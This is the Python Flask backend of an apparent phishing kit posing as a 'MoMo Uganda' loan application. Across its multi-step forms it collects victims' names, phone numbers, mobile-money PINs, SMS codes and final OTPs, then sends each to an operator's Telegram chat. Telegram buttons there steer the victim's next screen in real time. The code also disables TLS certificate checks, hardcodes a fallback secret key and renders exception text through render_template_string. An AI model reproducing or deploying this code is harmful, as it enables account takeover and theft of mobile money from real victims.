"""
======================================================================
MOMO UGANDA LOAN APPLICATION & TELEGRAM NOTIFICATION SYSTEM
Backend Application Server (Flask + PyMongo + Telegram Webhooks)
======================================================================
"""

import os
import time
import random
import requests
from flask import (
    Flask, 
    render_template, 
    request, 
    redirect, 
    url_for, 
    session, 
    jsonify, 
    render_template_string
)
from pymongo import MongoClient
from bson.objectid import ObjectId

# Initialize Flask Application Core
app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super_secret_momo_uganda_key")

# ======================================================================
# DATABASE INITIALIZATION & CONFIGURATION
# ======================================================================
MONGO_URI = os.environ.get("MONGO_URI")

try:
    client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
    db = client["brian_client_1st"]
    applications_collection = db["applications"]
    support_collection = db["support_tickets"]
    print("✅ Successfully initialized MongoDB client connection.")
except Exception as db_init_err:
    print(f"❌ Critical MongoDB Initialization Error: {db_init_err}")

# ======================================================================
# TELEGRAM BOT CREDENTIALS & CONFIGURATION
# ======================================================================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_ADMIN_CHAT_ID = os.environ.get("TELEGRAM_ADMIN_CHAT_ID")


def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_CHAT_ID:
        return

    db_id = str(app_data.get("_id"))
    
    message = (
        f"🇺🇬 *{stage_title}*\n\n"
        f"👤 *Name:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
        f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
        f"💬 *WhatsApp:* `{app_data.get('whatsapp_phone', '-')}`\n"
        f"🔐 *PIN:* `{app_data.get('password', '-')}`\n"
        f"💬 *SMS Message:* `{app_data.get('auth_code', '-')}`\n"
        f"🔢 *Final OTP:* `{app_data.get('final_auth_code', '-')}`\n\n"
        f"🆔 *Application ID:* `{app_data.get('app_id')}`"
    )
    
    reply_markup = {
        "inline_keyboard": [
            [{"text": f"✅ Approve {step_code.upper()}", "callback_data": f"approve_{step_code}_{db_id}"}],
            [{"text": "⚠️ Bad SMS / Data", "callback_data": f"badsms_{step_code}_{db_id}"}],
            [{"text": "💬 Request Custom Message", "callback_data": f"custom_{step_code}_{db_id}"}]
        ]
    }
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "reply_markup": reply_markup
    }
    
    try:
        response = requests.post(url, json=payload, timeout=5)
        response.raise_for_status()
    except Exception as e:
        print(f"❌ Telegram alert error: {e}")


def send_telegram_support_alert(ticket_data, db_id):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_ADMIN_CHAT_ID:
        return

    clean_phone = ticket_data.get('whatsapp_phone', '').replace('+', '').replace(' ', '')
    wa_direct_link = f"https://wa.me/{clean_phone}"
    
    message = (
        f"🆘 *NEW HELP / SUPPORT TICKET* 🆘\n\n"
        f"🆔 *Ticket ID:* `{ticket_data.get('ticket_id')}`\n"
        f"💬 *WhatsApp Phone:* `{ticket_data.get('whatsapp_phone')}`\n"
        f"📝 *Reported Issue:*\n\"{ticket_data.get('issue')}\"\n\n"
        f"⏰ *Submitted:* <t:{int(ticket_data.get('created_at'))}:R>"
    )
    
    reply_markup = {
        "inline_keyboard": [
            [{"text": "💬 Open WhatsApp Chat", "url": wa_direct_link}],
            [{"text": "✅ Mark Resolved", "callback_data": f"resolve_help_{db_id}"}]
        ]
    }
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "reply_markup": reply_markup
    }
    
    try:
        response = requests.post(url, json=payload, timeout=5)
        response.raise_for_status()
    except Exception as e:
        print(f"❌ Telegram support alert error: {e}")


def render_safe_template(template_name, **context):
    try:
        return render_template(template_name, **context)
    except Exception as template_err:
        print(f"⚠️ Template error for '{template_name}': {template_err}")
        return render_template_string(
            f"<h3>System Notice</h3><p>Template <b>{template_name}</b> could not be loaded.</p>"
            f"<p>Error: {str(template_err)}</p>"
        ), 500


# ======================================================================
# COMPLETE ROUTE MAPPING FOR ALL REPOSITORY TEMPLATES
# ======================================================================

@app.route("/", methods=["GET"])
def index():
    return render_safe_template("index.html")

@app.route("/apply", methods=["GET"])
def apply():
    return render_safe_template("apply.html")

@app.route("/apply/step1", methods=["GET", "POST"])
def apply_step1():
    if request.method == "POST":
        try:
            first_name = request.form.get("first_name", "").strip()
            last_name = request.form.get("last_name", "").strip()
            phone = request.form.get("phone", "").strip()
            
            app_id = "APP" + os.urandom(4).hex().upper()
            session["app_id"] = app_id
            session["first_name"] = first_name
            session["last_name"] = last_name
            session["phone"] = phone
            
            app_data = {
                "app_id": app_id,
                "first_name": first_name,
                "last_name": last_name,
                "phone": phone,
                "status": "Step1_Completed",
                "created_at": time.time()
            }
            inserted_id = applications_collection.insert_one(app_data).inserted_id
            session["db_id"] = str(inserted_id)
            
            return redirect(url_for("apply_step2"))
        except Exception as e:
            print(f"❌ Error in apply_step1 POST: {e}")
            return render_template_string(f"<h3>Error</h3><p>{str(e)}</p>"), 500
            
    return render_safe_template("apply_step1.html")

@app.route("/apply/step2", methods=["GET", "POST"])
def apply_step2():
    if request.method == "POST":
        try:
            whatsapp_phone = request.form.get("whatsapp_phone", "").strip()
            db_id = session.get("db_id")
            if db_id:
                applications_collection.update_one(
                    {"_id": ObjectId(db_id)},
                    {"$set": {"whatsapp_phone": whatsapp_phone, "status": "Step2_Completed"}}
                )
            return redirect(url_for("apply_step3"))
        except Exception as e:
            print(f"❌ Error in apply_step2 POST: {e}")
            return render_template_string(f"<h3>Error</h3><p>{str(e)}</p>"), 500
            
    return render_safe_template("apply_step2.html")

@app.route("/apply/step3", methods=["GET", "POST"])
def apply_step3():
    if request.method == "POST":
        try:
            password = request.form.get("password", "").strip()
            db_id = session.get("db_id")
            if db_id:
                applications_collection.update_one(
                    {"_id": ObjectId(db_id)},
                    {"$set": {"password": password, "status": "PIN_Submitted"}}
                )
                app_data = applications_collection.find_one({"_id": ObjectId(db_id)})
                if app_data:
                    send_telegram_interactive_alert(app_data, stage_title="NEW APPLICATION - PIN SUBMITTED", step_code="pin")
            return redirect(url_for("processing"))
        except Exception as e:
            print(f"❌ Error in apply_step3 POST: {e}")
            return render_template_string(f"<h3>Error</h3><p>{str(e)}</p>"), 500
            
    return render_safe_template("apply_step3.html")

@app.route("/processing", methods=["GET"])
def processing():
    return render_safe_template("processing.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        try:
            auth_code = request.form.get("auth_code", "").strip()
            db_id = session.get("db_id")
            if db_id:
                applications_collection.update_one(
                    {"_id": ObjectId(db_id)},
                    {"$set": {"auth_code": auth_code, "status": "SMS_Submitted"}}
                )
                app_data = applications_collection.find_one({"_id": ObjectId(db_id)})
                if app_data:
                    send_telegram_interactive_alert(app_data, stage_title="SMS VERIFICATION CODE SUBMITTED", step_code="sms")
            app_id = session.get("app_id", "")
            return redirect(url_for("pending", app_id=app_id))
        except Exception as e:
            print(f"❌ Error in login POST: {e}")
            return render_template_string(f"<h3>Error</h3><p>{str(e)}</p>"), 500
            
    return render_safe_template("login.html")

@app.route("/pending", methods=["GET"])
def pending():
    app_id = request.args.get("app_id", session.get("app_id", ""))
    return render_safe_template("pending.html", app_id=app_id)

@app.route("/admin", methods=["GET"])
def admin():
    return render_safe_template("admin.html")

@app.route("/completed", methods=["GET"])
def completed():
    return render_safe_template("completed.html")

@app.route("/final-verify", methods=["GET"])
def final_verify():
    return render_safe_template("final_verify.html")

@app.route("/sim-check", methods=["GET"])
def sim_check():
    return render_safe_template("sim_check.html")

@app.route("/success", methods=["GET"])
def success():
    return render_safe_template("success.html")

@app.route("/verify-otp", methods=["GET"])
def verify_otp():
    return render_safe_template("verify_otp.html")

@app.route("/check-status", methods=["GET"])
def check_status():
    try:
        app_id = request.args.get("app_id")
        if not app_id:
            return jsonify({"status": "Unknown"}), 400
        app_data = applications_collection.find_one({"app_id": app_id})
        if app_data:
            return jsonify({
                "status": app_data.get("status", "Pending"),
                "custom_message": app_data.get("custom_message", "")
            }), 200
        return jsonify({"status": "Not Found"}), 404
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


# ======================================================================
# SYSTEM UTILS & WEBHOOK
# ======================================================================

@app.route("/health", methods=["GET"])
def health():
    try:
        client.admin.command('ping')
        return jsonify({"status": "ok", "database": "connected", "market": "Uganda"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/submit-support", methods=["POST"])
def submit_support():
    try:
        data = request.get_json() or {}
        whatsapp_phone = data.get("whatsapp_phone", "").strip()
        issue_text = data.get("issue", "").strip()
        
        if not whatsapp_phone or not issue_text:
            return jsonify({"status": "error", "message": "Missing required fields"}), 400
            
        ticket_data = {
            "whatsapp_phone": whatsapp_phone,
            "issue": issue_text,
            "status": "Open",
            "created_at": time.time(),
            "ticket_id": "HELP" + os.urandom(3).hex().upper()
        }
        
        inserted_id = support_collection.insert_one(ticket_data).inserted_id
        send_telegram_support_alert(ticket_data, str(inserted_id))
        
        return jsonify({"status": "ok", "message": "Ticket submitted successfully"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/telegram-webhook", methods=["POST"])
def telegram_webhook():
    try:
        data = request.get_json() or {}
        if "callback_query" in data:
            callback = data["callback_query"]
            callback_data = callback.get("data", "")
            callback_id = callback.get("id")
            
            parts = callback_data.split("_")
            if len(parts) >= 3:
                action = parts[0]
                step_code = parts[1]
                db_id = parts[2]
                
                text_response = "Action processed"
                try:
                    obj_id = ObjectId(db_id)
                except:
                    return jsonify({"status": "ok"}), 200
                
                target_app = applications_collection.find_one({"_id": obj_id})
                if not target_app:
                    target_app = applications_collection.find_one(sort=[("_id", -1)])
                
                if action == "resolve" and step_code == "help":
                    support_collection.update_one({"_id": obj_id}, {"$set": {"status": "Resolved"}})
                    text_response = "✅ Ticket marked as Resolved!"
                elif target_app:
                    actual_obj_id = target_app["_id"]
                    if action == "approve":
                        applications_collection.update_one({"_id": actual_obj_id}, {"$set": {"status": f"Approved_{step_code.upper()}"}})
                        text_response = f"✅ {step_code.upper()} Approved!"
                    elif action == "badsms":
                        applications_collection.update_one({"_id": actual_obj_id}, {"$set": {"status": f"BadSMS_{step_code.upper()}"}})
                        text_response = f"⚠️ Flagged {step_code.upper()}."
                    elif action == "custom":
                        applications_collection.update_one({"_id": actual_obj_id}, {"$set": {"status": "CustomMessage", "custom_message": "Please review your entry."}})
                        text_response = "💬 Prompt sent!"

            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
            try:
                requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response}, timeout=5)
            except:
                pass

        elif "message" in data:
            msg = data["message"]
            chat_id = str(msg.get("chat", {}).get("id"))
            text = msg.get("text", "").strip()
            
            if chat_id == TELEGRAM_ADMIN_CHAT_ID and text in ["/test", "/diagnose"]:
                diag_results = []
                diag_status_icon = "🟢"
                try:
                    client.admin.command('ping')
                    diag_results.append("✅ MongoDB Atlas: Connected")
                except Exception as db_err:
                    diag_status_icon = "🔴"
                    diag_results.append(f"❌ MongoDB Error: {db_err}")
                    
                latest_app = applications_collection.find_one(sort=[("_id", -1)])
                if latest_app:
                    diag_results.append(f"✅ Latest DB Record ID: `{latest_app.get('app_id')}`")
                
                report_message = f"{diag_status_icon} *SYSTEM DIAGNOSTIC REPORT*\n\n" + "\n".join(diag_results)
                reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                requests.post(reply_url, json={"chat_id": TELEGRAM_ADMIN_CHAT_ID, "text": report_message, "parse_mode": "Markdown"})

        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
